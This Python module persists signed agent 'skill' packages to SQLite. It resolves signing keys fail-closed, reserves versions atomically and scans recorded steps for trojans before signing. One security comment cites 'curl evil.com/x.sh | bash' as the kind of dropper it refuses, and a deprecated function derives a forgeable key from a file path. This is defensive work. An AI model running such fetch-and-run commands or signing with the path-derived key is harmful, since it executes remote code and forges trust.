"""Shared persistence helpers for SkillPackage → skill_packages_view.

Extracted so both the REST API (hermes-shell-server) and the GTK4 shell
process can persist a signed skill into the shared SQLite DB without
duplicating SQL.

Callers:
  - hermes.shell_server.training.api  (server-side sign endpoint)
  - hermes.shell.presentation.gtk4.widgets.training_panel  (in-session sign)

P0-4 signing strategy:
  - build_signing_key() (v1, path-HMAC) is retained ONLY for read-side
    reference — it must NEVER be used for signing new skills.
  - resolve_signing_key() returns the native keystore key (v2) — fail-closed.
    If master.key is absent the function RAISES SigningKeyError. There is no
    v1 fallback for signing: absence of master.key means hermes-keygen has not
    completed, which is a fatal misconfiguration, not a graceful degradation.
    hermes-keygen.service is declared Before=hermes-shell-server.service so
    its absence is always an operator error, never a transient condition.
"""

from __future__ import annotations

import hashlib
import logging
import sqlite3
from pathlib import Path
from uuid import UUID

from hermes.agents_os.application.skill_compiler import SkillCompiler
from hermes.agents_os.application.training_session_orchestrator import (
    TrainingSessionOrchestrator,
    TrainingSessionState,
    VoiceCaptureRequired,
)

logger = logging.getLogger(__name__)


def _conn(db_path: Path) -> sqlite3.Connection:
    conn = sqlite3.connect(db_path, isolation_level=None)
    conn.row_factory = sqlite3.Row
    return conn


def build_signing_key(db_path: Path) -> bytes:
    """Derive a stable HMAC key from the db path (deterministic per node).

    DEPRECATED — retained as a READ-ONLY reference for documentation
    purposes only. Must NEVER be called for signing new skills (CWE-321:
    the key equals SHA-256(public path) and is publicly derivable).
    Calling this function for signing is a security regression.
    """
    return hashlib.sha256(str(db_path).encode()).digest()


def resolve_signing_key(db_path: Path) -> tuple[bytes, str]:  # noqa: ARG001
    """Return (key_bytes, 'v2') for signing a NEW skill — fail-closed.

    Uses the native keystore (SecretsVault.derive_subkey via
    NativeKeyStoreAdapter) exclusively. If master.key is absent this
    function raises SigningKeyError rather than falling back to v1.

    Rationale: hermes-keygen.service is declared
      Before=hermes-shell-server.service
    so absent master.key is a fatal misconfiguration, not a transient state.
    Signing with a predictable path-derived key (v1) produces forgeable
    signatures and must be rejected unconditionally.

    Args:
        db_path: accepted for signature compatibility but ignored — the
                 signing key is derived from master.key, never from a path.

    Raises:
        SigningKeyError: if master.key is absent or corrupt.
    """
    from hermes.shell_server.skills.native_keystore_adapter import (  # noqa: PLC0415
        NativeKeyStoreAdapter,
    )

    adapter = NativeKeyStoreAdapter()
    return adapter.get_signing_key_sync(), "v2"


def next_version_for_skill(db_path: Path, skill_id: str) -> int:
    """Return the next monotonic version number for the given skill_id.

    .. deprecated::
        Use _next_version_atomic() inside compile_and_persist instead,
        which computes and reserves the version in a single transaction.
        This function remains for callers that need a read-only estimate.
    """
    with _conn(db_path) as c:
        row = c.execute(
            "SELECT MAX(version) AS v FROM skill_packages_view WHERE skill_id = ?",
            (skill_id,),
        ).fetchone()
    current = row["v"] if row and row["v"] is not None else 0
    return current + 1


def _next_version_atomic(
    conn: sqlite3.Connection, skill_id: str
) -> int:
    """Read MAX(version)+1 inside the *already-open* transaction on `conn`.

    Caller must hold a BEGIN IMMEDIATE so the read-then-write is serialized.
    """
    row = conn.execute(
        "SELECT MAX(version) AS v FROM skill_packages_view WHERE skill_id = ?",
        (skill_id,),
    ).fetchone()
    current = row["v"] if row and row["v"] is not None else 0
    return current + 1


def persist_signed_skill(
    db_path: Path,
    *,
    package_id: str,
    skill_id: str,
    skill_name: str,
    version: int,
    state: str,
    surface_kinds: str,
    signed_at: str,
    signature_short: str | None,
    signature_hex: str | None = None,
) -> None:
    """Upsert one row into skill_packages_view.

    signature_hex: full 64-char HMAC hex, stored for verification at
    promotion time. signature_short (first 12 chars) is kept for display.
    """
    with _conn(db_path) as c:
        c.execute(
            """
            INSERT OR REPLACE INTO skill_packages_view (
              package_id, skill_id, skill_name, version, state,
              surface_kinds, signed_at, signature_short, signature_hex
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (
                package_id,
                skill_id,
                skill_name,
                version,
                state,
                surface_kinds,
                signed_at,
                signature_short,
                signature_hex,
            ),
        )


def compile_and_persist(
    *,
    db_path: Path,
    orchestrator: TrainingSessionOrchestrator,
    session_id: UUID,
    skill_name: str,
    signed_at: str,
    voice_captions: list[str] | None = None,
    transcription_failed_ack: bool = False,
) -> bool:
    """Compile the in-memory session into a SkillPackage and persist it.

    Args:
        voice_captions:          aggregated transcripts from the coordinator
                                 (collected_voice_captions()).  When provided
                                 they are joined and fed into the compiler as
                                 the intent_caption, bridging the gap between
                                 coordinator._state.voice_captions and the
                                 compiled SkillPackage (findings 1/3).
        transcription_failed_ack: user acknowledged that Whisper failed;
                                  forwarded to orchestrator.sign().

    Returns True if a package was persisted, False if skipped (no steps).
    """
    try:
        sess = orchestrator.get_session(session_id=session_id)
    except Exception:
        logger.debug("compile_and_persist: session not in orchestrator; skipping")
        return False

    if not sess.steps:
        logger.debug("compile_and_persist: no steps; skipping")
        return False

    # SECURITY (red-team 2026-06-19): scan the recorded STEPS for trojan patterns
    # (dropper / reverse shell / obfuscated exec) BEFORE signing. A malicious demo
    # (e.g. "curl evil.com/x.sh | bash") is REFUSED here so it can never be minted
    # into a runnable, promotable skill. This is the CONTENT half of the Security
    # Center for skills — previously the gate only saw the skill NAME, never the
    # steps. The EXECUTION half (egress netns jail + terminal install-gate + broker
    # HITL) still applies at replay; this stops the clearest trojans at creation.
    from hermes.agents_os.domain.skill_content_scan import (  # noqa: PLC0415
        assert_skill_content_safe,
    )
    _content_steps = [
        {
            "surface_kind": getattr(s.surface_kind, "value", str(s.surface_kind)),
            "action_payload": getattr(s, "action_payload", {}) or {},
        }
        for s in sess.steps
    ]
    # Raises SkillContentBlockedError on a CRITICAL finding (propagates to the panel,
    # like VoiceCaptureRequired). Returns HIGH/MEDIUM findings for owner review.
    _content_findings = assert_skill_content_safe(_content_steps)
    if _content_findings:
        logger.warning(
            "compile_and_persist: skill %s has %d non-blocking content finding(s): %s",
            skill_name,
            len(_content_findings),
            [(f.pattern, f.severity.value) for f in _content_findings[:5]],
        )

    aggregated_caption = " · ".join(c.strip() for c in (voice_captions or []) if c.strip())

    # Firmar ANTES de compilar: esto centraliza el gate de voz (sign() lanza
    # VoiceCaptureRequired si la sesión requería voz y el transcript está vacío
    # sin ack) y mueve la sesión a SIGNED, que es lo que exige compiler.compile.
    # VoiceCaptureRequired se propaga al caller (panel) para avisar al usuario.
    if sess.state != TrainingSessionState.SIGNED:
        orchestrator.sign(
            session_id=session_id,
            human_confirmed=True,
            aggregated_caption=aggregated_caption,
            transcription_failed_ack=transcription_failed_ack,
        )
        sess = orchestrator.get_session(session_id=session_id)

    key, signing_method = resolve_signing_key(db_path)
    compiler = SkillCompiler(signing_key=key, extra_caption=aggregated_caption or None)

    try:
        # Compute version and persist in one IMMEDIATE transaction to avoid
        # read-then-write TOCTOU when two callers sign the same skill concurrently.
        conn = sqlite3.connect(str(db_path), isolation_level=None)
        conn.row_factory = sqlite3.Row
        try:
            conn.execute("BEGIN IMMEDIATE")
            version = _next_version_atomic(conn, sess.skill_id)
            try:
                pkg = compiler.compile(session=sess, version=version)
            except VoiceCaptureRequired:
                conn.execute("ROLLBACK")
                raise
            except Exception:
                conn.execute("ROLLBACK")
                logger.exception("SkillCompiler.compile failed session=%s", session_id)
                return False

            surface_kinds_str = ",".join(sorted(sk.value for sk in pkg.surface_kinds))
            full_sig = pkg.signature_hex if pkg.signature_hex else None
            signature_short = full_sig[:12] if full_sig else None
            conn.execute(
                """
                INSERT OR REPLACE INTO skill_packages_view (
                  package_id, skill_id, skill_name, version, state,
                  surface_kinds, signed_at, signature_short, signing_method,
                  signature_hex
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (
                    str(pkg.package_id),
                    pkg.skill_id,
                    skill_name,
                    pkg.version,
                    pkg.state.value,
                    surface_kinds_str,
                    signed_at,
                    signature_short,
                    signing_method,
                    full_sig,
                ),
            )
            conn.execute("COMMIT")
        finally:
            conn.close()
    except VoiceCaptureRequired:
        raise
    except Exception:
        logger.exception("compile_and_persist: transaction failed session=%s", session_id)
        return False

    logger.info(
        "skill_package.persisted package=%s skill=%s version=%s",
        pkg.package_id,
        pkg.skill_id,
        pkg.version,
    )
    return True
